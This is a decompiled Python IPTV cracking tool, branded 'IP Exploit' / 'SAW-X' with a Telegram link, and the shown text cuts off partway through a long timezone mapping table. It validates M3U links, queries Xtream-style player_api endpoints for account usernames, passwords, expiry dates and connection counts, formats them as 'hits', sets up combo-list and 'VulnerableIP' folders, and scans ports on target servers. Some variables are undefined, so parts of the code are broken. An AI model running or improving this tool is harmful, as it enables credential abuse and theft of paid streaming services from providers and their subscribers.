# -*- coding: utf-8 -*-
# uncompyle6 version 3.9.1
# Python bytecode version base 3.6 (3379)
# Decompiled from: Python 3.6.8 (tags/v3.6.8:3c6b436a57, Dec 24 2018, 00:16:47) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: <Moon>
import os, pip, sys, copy, re, functools, json, string, threading, codecs, select, datetime, time, struct, random
from random import uniform
from datetime import date
from queue import PriorityQueue
from socket import AF_INET, socket
from socket import SOCK_STREAM
from concurrent.futures import ThreadPoolExecutor, thread
from urllib.parse import urlparse, parse_qs
from optparse import OptionParser
from _socket import SHUT_RDWR
from collections import deque
os.system("cls" if os.name == "nt" else "clear")
try:
    import m3u8
except:
    pip.main(["install", "m3u8"])
    import m3u8

try:
    import colorama
except:
    pip.main(["install", "colorama"])

from colorama import Fore, Back, init
init()
try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass

try:
    import threading
except:
    pass

try:
    import requests
except:
    print("requests module not found \n requests module installing now... \n")
    pip.main(["install", "requests"])

import requests, urllib3
try:
    import sock
except:
    print("sock module not found \n sock module installing now \n")
    pip.main(["install", "requests[socks]"])
    pip.main(["install", "sock"])
    pip.main(["install", "socks"])
    pip.main(["install", "PySocks"])

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ses = requests.Session()
ESC = "\x1b["
RST = ESC + "0m"
BOLD = ESC + "1m"
P = ESC + "30m"
PC = ESC + "90m"
V = ESC + "31m"
VC = ESC + "91m"
VD = ESC + "32m"
VDC = ESC + "92m"
A = ESC + "33m"
AC = ESC + "93m"
AZ = ESC + "34m"
AZC = ESC + "94m"
M = ESC + "35m"
MC = ESC + "95m"
C = ESC + "36m"
CC = ESC + "96m"
B = ESC + "37m"
BC = ESC + "97m"
VDB = ESC + "1;32m"
CB = ESC + "97;100m"
PB = ESC + "90;100m"
import traceback, traceback
PUERTO_INICIO_SCAN = 0
PUERTO_FIN_SCAN = 30000
SCAN_LENTO = 0
SCAN_NORMAL = 1
SCAN_PORTS_LOCAL = 0
SCAN_PORTS_WEB = 1
hitc = 0
scanPORTTYPE = "LOCAL"
debug = False
escribirDatosServerVulnerable_used = False
totalHilosConsumidores = 20
totalHilosProductores = 400
_puertoINICIO_SCAN = 0
_puertoFIN_SCAN = 65535
nick = ""
selectm = ""
respueta = ""
import platform, threading, time, sys, os
lock = threading.Lock()
lockContenedorDatos = threading.Lock()
version = 3.9

def print_slow(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

    print()


def loading_animation(duration=5):
    frames = [
     "⌛", "⏳", "⌛", "⏳"]
    symbols = ["◐", "◓", "◑", "◒"]
    end_time = time.time() + duration
    idx = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{frames[idx % len(frames)]} {symbols[idx % len(symbols)]} \x1b[91mLoading... Please wait... {symbols[(idx + 1) % len(symbols)]}")
        sys.stdout.flush()
        time.sleep(0.2)
        idx += 1

    sys.stdout.write("\r" + " " * 50 + "\r")


cadena = "\x1b[47;101m 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: " + str(version) + " \x1b[0m"
APXLL = "\n\x1b[1;31m  \x1b[91m\n      _    _    _   _  _         _     \n     /_\\  | |  (_) | || |__ _ __| | ___  \n    / _ \\ | |  | | | __ / _` / _|  /  /  \n   /  _  \\| |__| | | __ / _` / _| / /  \n  /__/ \\__\\____|_| |_||_\\__,_\\__|_\\__\\  \n                                                                      \n\x1b[0m                                      \n\x1b[1;31m❖︎ C͟H͟E͟C͟K͟ M͟3U͟ ❖︎\x1b[0m\n"
pasa2 = "\n\x1b[1;34m╓\x1b[0m\x1b[1;32mIP Exploit \x1b[1;31m𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𝕌Ｌ𝐭ｉ𝔪άт𝑒   \x1b[0m\n\x1b[1;34m╚➥\x1b[0mTelegram: \x1b[1;36mhttps://t.me/+n8ZcWSyfV3MzN2I0\x1b[0m\n"

def show_title():
    os.system("clear")
    loading_animation(5)
    print_slow(APXLL, 0.02)
    print_slow(cadena, 0.05)
    print_slow(pasa2, 0.05)


show_title()
pasa2 = "\n╓    iP Exploit 𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𝕌Ｌ𝐭ｉ𝔪άт𝑒 \n╚➥Telegram https://t.me/+n8ZcWSyfV3MzN2I0\n"
print(cadena)
print(APXLL)
ip_pool = set()

def main():
    m3u_url = input("\x1b[0m ◌ 𝙻𝚒𝚗𝚔 𝙼3𝚞 \x1b[91m\x1b[1m ➠ \x1b[0m \x1b[0m")
    try:
        response = requests.get(m3u_url)
        if response.status_code == 200:
            print("\x1b[1;91m Sᴇʀvɪᴅᴏʀ: \x1b[92m𝐎𝐍_𝐋𝐈𝐍𝐄  \x1b ")
            payload_url = re.sub("get\\.php", "player_api.php", m3u_url)
            response = requests.get(payload_url)
            if response.status_code == 200:
                message_match = re.search('"message":"(.*?)"', response.text)
                if message_match:
                    message = message_match.group(1)
                    message = str(message.encode("utf-8").decode("unicode-escape")).replace("\\/", "/")
                    timezone = re.search('"timezone":"(.*?)"', response.text).group(1)
                    timezone = timezone.replace("\\/", "/")
                    active_cons = re.search('"active_cons":"(.*?)"', response.text).group(1)
                    max_connections = re.search('"max_connections":"(.*?)"', response.text).group(1)
                    print("\x1b[1;31m Tɪᴍᴇᴢoɴᴇ: \x1b[32m" + timezone + "\x1b[0m")
                    print("\x1b[1;31m Acᴛ.Cᴏɴɴ: \x1b[32m" + active_cons + "\x1b[0m")
                    print("\x1b[1;31m Mᴀx.Cᴏɴɴ: \x1b[32m" + max_connections + "\x1b[0m")
                else:
                    print("Mensagem não encontrada na resposta.")
                    with open(output_file, "a") as file:
                        file.write("Mensagem não encontrada na resposta.\n")
            else:
                print("❗️Falha ao recuperar informações da API do Player.")
                with open(output_file, "a") as file:
                    file.write("Falha ao recuperar informações da API do Player.\n")
        else:
            print("❗️Link M3U não funcionando:", m3u_url)
    except requests.exceptions.RequestException as e:
        print("❗️❗️Error when making HTTP request:", e)


if __name__ == "__main__":
    main()
    input("Press  \x1b[92mENTER \x1b[0mto continue!!...")
else:
    #logopic = f"\n \x1b[91m\n\n      _    _    _   _  _         _     \n     /_\\  | |  (_) | || |__ _ __| | ___  \n    / _ \\ | |  | | | __ / _` / _|  /  /  \n   /  _  \\| |__| | | __ / _` / _| / /  \n  /__/ \\__\\____|_| |_||_\\__,_\\__|_\\__\\  \n                                                                      \n\x1b[0m           \n \n\n{RST}\n"
    APXLL = f"\x1b[7m               ❖︎ 𖣘-𝚇 𝙴𝚇𝙿𝙻𝙾𝙸𝚃 ❖︎              {RST}\n"

def cls():os.system("cls" if os.name == "nt" else "clear")


NAME = "SAW-X"
cls()

def check_os():
    if platform.system() == "Windows":
        return "."
    else:
        return "/sdcard"


if check_os() == ".":
    my_os = "Wɪɴᴅᴏᴡs"
else:
    my_os = "Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_version()
print(f'\x1b[1;32m Sɪsᴛᴇᴍᴀ: {"Wɪɴᴅᴏᴡs" if platform.system() == "Windows" else "Aɴᴅʀᴏɪᴅ"}\x1b[0m')

def check_folders(folder_list):
    for folder in folder_list:
        os.makedirs((check_os() + folder), exist_ok=True)


check_folders(['/debug', '/combo', '/combo/userpass/', '/Hits/', '/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/', '/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/VulnerableIP/', 
 '/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/Full/', '/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/m3u/', '/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/Combo/'])
hits = check_os() + "/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/VulnerableIP/"
decode_hex = codecs.getdecoder("hex_codec")

class PortScanner:
    header1 = {
     'Host': '"www.ipfingerprints.com"', 
     'Connection': '"keep-alive"', 
     'Accept': '"application/json, text/javascript,*/*; q=0.01"', 
     'Content-Type': '"application/x-www-form-urlencoded"', 
     'X-Requested-With': '"XMLHttpRequest"', 
     'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"', 
     'sec-ch-ua-platform': '\'"Windows"\'', 
     'Origin': '"https://www.ipfingerprints.com"', 
     'Referer': '"https://www.ipfingerprints.com/portscan.php"', 
     'Accept-Language': '"es-US,es-419;q=0.9,es;q=0.8"', 
     'Accept-Encoding': '"gzip, deflate"'}

    def tratarSalidaPuertos(self, _entrada: dict):
        puertos = []
        cadena = _entrada["portScanInfo"]
        separada = cadena.split("\n")
        for elemento in separada:
            if elemento.find("tcp") >= 0 and elemento.find("open") >= 0:
                pos = elemento.find("/")
                puertos.append(int(elemento[:pos]))

        return puertos

    def createCoockiePanel(self, _host, _startport, _endport):
        coockieDat = {
         'remoteHost': _host, 
         'start_port': _startport, 
         'end_port': _endport, 
         'normalScan': '"Yes"', 
         'scan_type': '"connect"', 
         'ping_type': '"none"'}
        return coockieDat

    def searchOpenPorts_WEB(self, initPort: int, finishPort: int, ipServerToScan: str):
        print("\x1b[32m Scanning Ports with WEB Method:\n   ❖︎  \x1b[0m", ipServerToScan)
        parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
        try:
            dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=(self.header1), data=parametros, timeout=300)
            puertos = self.tratarSalidaPuertos(dat.json())
            return puertos
        except Exception as errp:
            print("Error invoking url to detect ports:", errp)
            return []

    def test_port_number(self, host, port):
        with socket(AF_INET, SOCK_STREAM) as sock:
            sock.settimeout(5)
            try:
                sock.connect((host, port))
                print(Fore.GREEN, " ❖︎ Open port ►", Fore.RESET, port)
                sock.shutdown(SHUT_RDWR)
                sock.close()
                return True
            except:
                sock.close()
                return False

    def port_scan(self, host, port: range, _scaneoLento):
        if scanPORTTYPE == "WEB":
            return self.searchOpenPorts_WEB(port.start, port.stop, host)
        else:
            return self.test_port_numberLOCAL(host, port, _scaneoLento)

    def test_port_numberLOCAL(self, host, ports, scaneLento):
        print(Fore.RED, "Scann Local/Method:", Fore.MAGENTA, f"\n➥ {host}...", Fore.RESET)
        ports = [
         21, 22, 25, 53, 80, 110, 119, 143, 443, 465, 
         563, 587, 826, 993, 995, 1421, 2052, 2053, 2077, 2078, 
         2082, 2083, 2086, 2087, 2091, 2095, 2096, 3306, 7080, 
         7392, 7999, 8080, 8081, 8086, 8443, 8880, 9098, 9112, 
         9912, 9992, 15001, 24564, 25461, 25462, 25463, 25469, 
         25867, 31210, 37000, 45463, 46000, 46500]
        totalHilos = len(ports)
        if scaneLento == True:
            totalHilos = 1
        with ThreadPoolExecutor(totalHilos) as executor:
            results = executor.map(self.test_port_number, [host] * len(ports), ports)
            openPorts = []
            for port, is_open in zip(ports, results):
                if is_open:
                    openPorts.append(port)

            if debug:
                print("Ports:", openPorts)
            return openPorts


class HitData:
    created = ""
    portal = ""
    url = ""
    m3uURL = ""
    user = ""
    password = ""
    caducidad = ""
    outputFormats = ""
    conexionesActivas = ""
    maxConexiones = ""
    kanalsayisi = "#𝐍𝐎_𝐈𝐍𝐅𝐎"
    filmsayisi = "#𝐍𝐎_𝐈𝐍𝐅𝐎"
    dizisayisi = "#𝐍𝐎_𝐈𝐍𝐅𝐎"
    message = "𝐈𝐏𝐓𝐕 𝐅𝐑𝐄𝐄!!!"
    trial = "𝑵𝑶 𝑰𝑵𝑭𝑶"
    hprotocol = "𝑵𝑶 𝑰𝑵𝑭𝑶"
    realport = "𝑵𝑶 𝑰𝑵𝑭𝑶"
    httpsport = "𝑵𝑶 𝑰𝑵𝑭𝑶"
    rtmpport = "𝑵𝑶 𝑰𝑵𝑭𝑶"
    timezone = ""
    panel = ""
    port = ""
    real = ""
    vpn = ""
    nick = ""
    accountType = "no data"
    m3uValid = ""
    serial = ""
    shortSerial = ""
    deviceID1 = ""
    deviceID2 = ""
    realc = url + ":" + port

    def setData(self, portalName, url, m3uUrl, user, password, outputFormats, ficheroAsociado, puerto, nick):
        self.portal = portalName
        self.panel = portalName
        self.url = url
        self.outputFormats = outputFormats
        self.m3uURL = m3uUrl
        self.user = user
        self.password = password
        self.ficherosSalida = ficheroAsociado
        self.livelist = liveList
        self.vodlist = vodList
        self.serieslist = serieList
        self.port = puerto
        self.nick = nick

    def __str__(self):
        output = "\n🎩▂▂✭𝔼𝕩𝕡𝕝𝕠𝕚𝕥🐉𝕌𝕝𝕥𝕣𝕒✭▂▂🎩\n╓✪»ᴘʀᴏ ᴘʀᴇᴍɪᴜᴍ ʙʏ CRACKANDROID\n╚❪✪» 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: " + str(version) + "\nᴘʏ ᴄᴏɴғɪɢ -❪ " + nick + " ❫\n❖︎ Exᴘɪʀᴇ ➢ " + str(time.strftime("%H:%M:%S")) + " / " + str(time.strftime("%d %B %Y")) + " \n❖︎ R ➢ http://" + self.realm + ":" + self.portr + "/c/\n❖︎ P𝚘𝚛𝚝 ➢" + self.port + "\n❖ [ https://t.me/+n8ZcWSyfV3MzN2I0 ●  ]\n❖︎ U𝚜𝚎𝚛 ➢" + self.user + "\n❖︎ P𝚊𝚜𝚜 ➢" + self.password + "\n❖︎ Cʀᴇᴀᴛᴇᴅ ➢" + self.created + "\n❖︎ Exᴘɪʀᴇs ➢" + self.caducidad + "\n❖︎ Sᴛᴀᴛᴜs ➢" + self.m3uValid + "\n❖︎ Cᴏɴɴ ➢𝗠𝗮𝘅 ‣ " + self.maxConexiones + " / 𝗔𝗰𝘁 ‣ " + self.conexionesActivas + "\n❖︎ TɪᴍᴇZᴏɴᴇ ➢" + self.timezone + "\n❖︎ Aʟʟᴏᴡᴇᴅ Fᴏʀᴍᴀᴛs ➢" + self.outputFormats + "\n❖︎ P𝚘𝚛𝚝𝚊𝚕 ➢http://" + self.panel + "/c/\n❖︎ Message ➢" + str(self.message) + "\n❖︎ ᴘʏ ᴄᴏɴғɪɢ -❪ " + nick + " ❫\n --- •❖••❖• ---- \n✪ Hɪᴛꜱ ʙʏ ☞ CRACKANDROID  ☜\n❖  𝐌𝐚𝐱 ● 𝐔26 ღ ʙʏ Α_ρxℓℓ\n✦ HɪᴛTɪᴍᴇ: 22:21 ◌ 21.06.2024\n✷ #𝐏𝐫𝐞𝐦𝐢𝐮𝐦𝐏𝐘 ◌ #𝕄𝔸𝕏\n▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂\n\n❖︎\n▄▄︻デ𝗘𝗣𝗚🐉𝐋𝐢𝐧𝐤1══一※ http://" + self.realm + ":" + self.portr + "/get.php?username=" + self.user + "&password=" + self.password + "&type=m3u_plus\n▄▄︻デ𝗠𝟯𝗨🐉𝐋𝐢𝐧𝐤2═一※ http://" + self.url + "/get.php?username=" + self.user + "&password=" + self.password + "&type=m3u_plus\n▄▄︻デ𝗠𝟯𝗨🐉𝐋𝐢𝐧𝐤3═一※ " + self.m3uURL + "&output=m3u8\n╔❪✪» 𝗠𝗲𝗱𝗶𝗮 ☟︎︎︎ 𝗖𝗼𝘂𝗻𝘁 «✪❫\n❖︎ #𝐓𝐯 ➢" + self.kanalsayisi + "\n❖︎ #𝐌𝐨𝐯 ➢" + self.filmsayisi + "\n❖︎ #𝐒𝐞𝐫𝐢𝐞𝐬 ➢" + self.dizisayisi + "\n╚❪✪» 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 🛡 𝗟𝗶𝘀𝘁 ➢|| " + str(self.livelist) + " «✪❫ #𝕃𝕀𝕍𝔼 || \n▂▂| #𝗣𝘆𝘁𝗵𝗼𝗻 CRACKANDROID\xa0 #𝗦𝗰𝗿𝗶𝗽𝘁 |▂▂  "
        return output


class InfoServer:
    lista_puertosIP: dict
    host: str
    listaDNS: dict
    canalesM3U = ""

    def __init__(self):
        self.lista_puertosIP = dict()
        self.listaDNS = dict()


class M3U_UTILS:
    HEADER1_M3U = {
     'Cookie': '"stb_lang=en; timezone=Europe%2FIstanbul;"', 
     'X-User-Agent': '"Model: MAG254; Link: Ethernet"', 
     'Connection': '"Keep-Alive"', 
     'Accept-Encoding': '"gzip, deflate"', 
     'Accept': '"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"', 
     'User-Agent': '"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"'}

    def getHeaderM3U_withHOST(self, host):
        HEADER1_m3u = {
         'Accept': '"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"', 
         'Accept-Encoding': '"gzip,deflate"', 
         'Accept-Language': '"es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"', 
         'Connection': '"keep-alive"', 
         'Host': host, 
         'Upgrade-Insecure-Requests': '"1"', 
         'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76"'}
        return HEADER1_m3u

    def extractDataFromList(self, user, passw, reponseMessage, panel, hitData):
        try:
            try:
                kanalsayisi = "#𝐍𝐎_𝐈𝐍𝐅𝐎"
                filmsayisi = "#𝐍𝐎_𝐈𝐍𝐅𝐎"
                dizisayisi = "#𝐍𝐎_𝐈𝐍𝐅𝐎"
                veri = ""
                url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_live_streams"
                res = ses.get(url5, timeout=5, verify=False)
                veri = str(res.text)
                kanalsayisi = str(veri.count("stream_id"))
                url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_vod_streams"
                filmsayisi = ""
                res = ses.get(url5, timeout=5, verify=False)
                veri = str(res.text)
                filmsayisi = str(veri.count("stream_id"))
                url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_series"
                dizisayisi = ""
                res = ses.get(url5, timeout=5, verify=False)
                veri = str(res.text)
                dizisayisi = str(veri.count("series_id"))
            except:
                pass

            hitData.kanalsayisi = kanalsayisi
            hitData.filmsayisi = filmsayisi
            hitData.dizisayisi = dizisayisi
            try:
                message = reponseMessage.split('message":"')[1].split(",")[0].replace('"', "")
                message = str(message.encode("utf-8").decode("unicode-escape")).replace("\\/", "/")
            except:
                pass

            hitData.message = message
            hitData.panel = panel
            hitData.user = user
            hitData.password = passw
            acon = ""
            acon = reponseMessage.split('active_cons":')[1]
            acon = acon.split(",")[0]
            acon = acon.replace('"', "")
            hitData.conexionesActivas = acon
            realm = reponseMessage.split('url":')[1]
            realm = realm.split(",")[0]
            realm = realm.replace('"', "")
            hitData.realm = realm
            portr = reponseMessage.split('port":')[1]
            portr = portr.split(",")[0]
            portr = portr.replace('"', "")
            hitData.portr = portr
            creat = reponseMessage.split('created_at":')[1]
            creat = creat.split(",")[0]
            creat = creat.replace('"', "")
            creat = datetime.datetime.fromtimestamp(int(creat)).strftime("%d.%b.%Y %H:%M")
            hitData.created = creat
            mcon = reponseMessage.split('max_connections":')[1]
            mcon = mcon.split(",")[0]
            mcon = mcon.replace('"', "")
            hitData.maxConexiones = mcon
            timezone = reponseMessage.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.split('"}')[0]
            timezone = timezone.replace("\\/", "/")
            timezone = timezone.replace("Africa/Windhoek", "🇳🇦Windhoek[NA]")
            timezone = timezone.replace("Africa/Abidjan", "🇨🇮Abidjan[CI]")
            timezone = timezone.replace("Africa/Accra", "🇬🇭Accra[GH]")
            timezone = timezone.replace("Africa/Addis_Ababa", "🇪🇹Addis Ababa[ET]")
            timezone = timezone.replace("Africa/Algiers", "🇩🇿Algiers[DZ]")
            timezone = timezone.replace("Africa/Asmara", "🇪🇷Asmara[ER]")
            timezone = timezone.replace("Africa/Asmera", "🇪🇷Asmera[ER]")
            timezone = timezone.replace("Africa/Bamako", "🇲🇱Bamako[ML]")
            timezone = timezone.replace("Africa/Bangui", "🇨🇫Bangui[CF]")
            timezone = timezone.replace("Africa/Banjul", "🇬🇲Banjul[GM]")
            timezone = timezone.replace("Africa/Bissau", "🇬🇼Bissau[GW]")
            timezone = timezone.replace("Africa/Blantyre", "🇲🇼Blantyre[MW]")
            timezone = timezone.replace("Africa/Brazzaville", "🇨🇬Brazzaville[CG]")
            timezone = timezone.replace("Africa/Bujumbura", "🇧🇮Bujumbura[BI]")
            timezone = timezone.replace("Africa/Cairo", "🇪🇬CairoPT[EG]")
            timezone = timezone.replace("Africa/Casablanca", "🇲🇦Casablanca[MA]")
            timezone = timezone.replace("Africa/Ceuta", "🇪🇸Ceuta[ES]")
            timezone = timezone.replace("Africa/Conakry", "🇬🇳Conakry[GN]")
            timezone = timezone.replace("Africa/Dakar", "🇸🇳Dakar[SN]")
            timezone = timezone.replace("Africa/Dar_es_Salaam", "🇹🇿Dar es Salaam[TZ]")
            timezone = timezone.replace("Africa/Djibouti", "🇩🇯Djibouti[DJ]")
            timezone = timezone.replace("Africa/Douala", "🇨🇲Douala[CM]")
            timezone = timezone.replace("Africa/El_Aaiun", "🇪🇭El Aaiun[EH]")
            timezone = timezone.replace("Africa/Freetown", "🇸🇱Freetown[SL]")
            timezone = timezone.replace("Africa/Gaborone", "🇧🇼Gaborone[BW]")
            timezone = timezone.replace("Africa/Harare", "🇿🇼Harare[ZW]")
            timezone = timezone.replace("Africa/Johannesburg", "🇿🇦Johannesburg[ZA]")
            timezone = timezone.replace("Africa/Juba", "🇸🇸Juba[SS]")
            timezone = timezone.replace("Africa/Kampala", "🇺🇬Kampala[UG]")
            timezone = timezone.replace("Africa/Khartoum", "🇸🇩Khartoum[SD]")
            timezone = timezone.replace("Africa/Kigali", "🇷🇼Kigali[RW]")
            timezone = timezone.replace("Africa/Kinshasa", "🇨🇩Kinshasa[CD]")
            timezone = timezone.replace("Africa/Lagos", "🇳🇬Lagos[NG]")
            timezone = timezone.replace("Africa/Libreville", "🇬🇦Libreville[GA]")
            timezone = timezone.replace("Africa/Lome", "🇹🇬Lomé[TG]")
            timezone = timezone.replace("Africa/Luanda", "🇦🇴Luanda[AO]")
            timezone = timezone.replace("Africa/Lubumbashi", "🇨🇩Lubumbashi[CD]")
            timezone = timezone.replace("Africa/Lusaka", "🇿🇲Lusaka[ZM]")
            timezone = timezone.replace("Africa/Malabo", "🇬🇶Malabo[GQ]")
            timezone = timezone.replace("Africa/Maputo", "🇲🇿Maputo[MZ]")
            timezone = timezone.replace("Africa/Maseru", "🇱🇸Maseru[LS]")
            timezone = timezone.replace("Africa/Mbabane", "🇸🇿Mbabane[SZ]")
            timezone = timezone.replace("Africa/Mogadishu", "🇸🇴Mogadishu[SO]")
            timezone = timezone.replace("Africa/Monrovia", "🇱🇷Monrovia[LR]")
            timezone = timezone.replace("Africa/Nairobi", "🇰🇪Nairobi[KE]")
            timezone = timezone.replace("Africa/Ndjamena", "🇹🇩Ndjamena[TD]")
            timezone = timezone.replace("Africa/Niamey", "🇳🇪Niamey[NE]")
            timezone = timezone.replace("Africa/Nouakchott", "🇲🇷Nouakchott[MR]")
            timezone = timezone.replace("Africa/Ouagadougou", "🇧🇫Ouagadougou[BF]")
            timezone = timezone.replace("Africa/Porto-Novo", "🇧🇯Porto-Novo[BJ]")
            timezone = timezone.replace("Africa/Sao_Tome", "🇸🇹São Tomé[ST]")
            timezone = timezone.replace("Africa/Timbuktu", "🇲🇱Timbuktu[ML]")
            timezone = timezone.replace("Africa/Tripoli", "🇱🇾Tripoli[LY]")
            timezone = timezone.replace("Africa/Tunis", "🇹🇳Tunis[TN]")
            timezone = timezone.replace("America/Adak", "🇺🇸Adak[US]")
            timezone = timezone.replace("America/Anchorage", "🇺🇸Anchorage[US]")
            timezone = timezone.replace("America/Anguilla", "🇦🇮Anguilla[AI]")
            timezone = timezone.replace("America/Antigua", "🇦🇬Antigua[AG]")
            timezone = timezone.replace("America/Araguaina", "🇧🇷Araguaína[BR]")
            timezone = timezone.replace("America/Argentina/Buenos_Aires", "🇦🇷Buenos Aires[AR]")
            timezone = timezone.replace("America/Argentina/Catamarca", "🇦🇷Catamarca[AR]")
            timezone = timezone.replace("America/Argentina/ComodRivadavia", "🇦🇷ComodRivadavia[AR]")
            timezone = timezone.replace("America/Argentina/Cordoba", "🇦🇷Córdoba[AR]")
            timezone = timezone.replace("America/Argentina/Jujuy", "🇦🇷Jujuy[AR]")
            timezone = timezone.replace("America/Argentina/La_Rioja", "🇦🇷La Rioja[AR]")
            timezone = timezone.replace("America/Argentina/Mendoza", "🇦🇷Mendoza[AR]")
            timezone = timezone.replace("America/Argentina/Rio_Gallegos", "🇦🇷Río Gallegos[AR]")
            timezone = timezone.replace("America/Argentina/Salta", "🇦🇷Salta[AR]")
            timezone = timezone.replace("America/Argentina/San_Juan", "🇦🇷San Juan[AR]")
            timezone = timezone.replace("America/Argentina/San_Luis", "🇦🇷San Luis[AR]")
            timezone = timezone.replace("America/Argentina/Tucuman", "🇦🇷Tucumán[AR]")
            timezone = timezone.replace("America/Argentina/Ushuaia", "🇦🇷Ushuaia[AR]")
            timezone = timezone.replace("America/Aruba", "🇦🇼Aruba[AW]")
            timezone = timezone.replace("America/Asuncion", "🇵🇾Asunción[PY]")
            timezone = timezone.replace("America/Atikokan", "🇨🇦Atikokan[CA]")
            timezone = timezone.replace("America/Atka", "🇺🇸Atka[US]")
            timezone = timezone.replace("America/Bahia", "🇧🇷Bahia[BR]")
            timezone = timezone.replace("America/Bahia_Banderas", "🇲🇽Bahía Banderas[MX]")
            timezone = timezone.replace("America/Barbados", "🇧🇧Barbados[BB]")
            timezone = timezone.replace("America/Belem", "🇧🇷Belém[BR]")
            timezone = timezone.replace("America/Belize", "🇧🇿Belize[BZ]")
            timezone = timezone.replace("America/Blanc-Sablon", "🇨🇦Blanc-Sablon[CA]")
            timezone = timezone.replace("America/Boa_Vista", "🇧🇷Boa Vista[BR]")
            timezone = timezone.replace("America/Bogota", "🇨🇴Bogotá[CO]")
            timezone = timezone.replace("America/Boise", "🇺🇸Boise[US]")
            timezone = timezone.replace("America/Buenos_Aires", "🇦🇷Buenos Aires[AR]")
            timezone = timezone.replace("America/Cambridge_Bay", "🇨🇦Cambridge Bay[CA]")
            timezone = timezone.replace("America/Campo_Grande", "🇧🇷Campo Grande[BR]")
            timezone = timezone.replace("America/Cancun", "🇲🇽Cancún[MX]")
            timezone = timezone.replace("America/Caracas", "🇻🇪Caracas[VE]")
            timezone = timezone.replace("America/Catamarca", "🇦🇷Catamarca[AR]")
            timezone = timezone.replace("America/Cayenne", "🇬🇫Cayenne[GF]")
            timezone = timezone.replace("America/Cayman", "🇰🇾Cayman[KY]")
            timezone = timezone.replace("America/Chicago", "🇺🇸Chicago[US]")
            timezone = timezone.replace("America/Chihuahua", "🇲🇽Chihuahua[MX]")
            timezone = timezone.replace("America/Ciudad_Juarez", "🇲🇽Ciudad Juárez[MX]")
            timezone = timezone.replace("America/Coral_Harbour", "🇨🇦Coral Harbour[CA]")
            timezone = timezone.replace("America/Cordoba", "🇦🇷Córdoba[AR]")
            timezone = timezone.replace("America/Costa_Rica", "🇨🇷Costa Rica[CR]")
            timezone = timezone.replace("America/Creston", "🇨🇦Creston[CA]")
            timezone = timezone.replace("America/Cuiaba", "🇧🇷Cuiabá[BR]")
            timezone = timezone.replace("America/Curacao", "🇨🇼Curaçao[CW]")
            timezone = timezone.replace("America/Danmarkshavn", "🇬🇱Danmarkshavn[GL]")
            timezone = timezone.replace("America/Dawson", "🇨🇦Dawson[CA]")
            timezone = timezone.replace("America/Dawson_Creek", "🇨🇦Dawson Creek[CA]")
            timezone = timezone.replace("America/Denver", "🇺🇸Denver[US]")
            timezone = timezone.replace("America/Detroit", "🇺🇸Detroit[US]")
            timezone = timezone.replace("America/Dominica", "🇩🇲Dominica[DM]")
            timezone = timezone.replace("America/Edmonton", "🇨🇦Edmonton[CA]")
            timezone = timezone.replace("America/Eirunepe", "🇧🇷Eirunepé[BR]")
